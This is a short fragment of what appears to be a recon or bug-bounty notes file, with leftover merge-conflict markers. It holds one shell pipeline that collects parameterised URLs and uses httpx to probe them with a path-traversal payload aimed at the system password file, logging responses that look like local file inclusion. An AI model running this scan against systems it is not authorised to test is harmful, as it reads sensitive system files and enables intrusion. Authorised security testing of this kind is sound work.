...
=======
cat gau_links/gau_compiled/gau_compiled.txt | grep -i "=" > sensitive/urls_to_test.txt; httpx -l sensitive/urls_to_test.txt -path "/////////../../../../../../../../etc/password" -status-code -mc 200 -m 'root:'  | anew sensitive/anew lfi.txt
>>>>>>> 7d31c76d509893a2f0f29a65e6a0e5489918e2e3
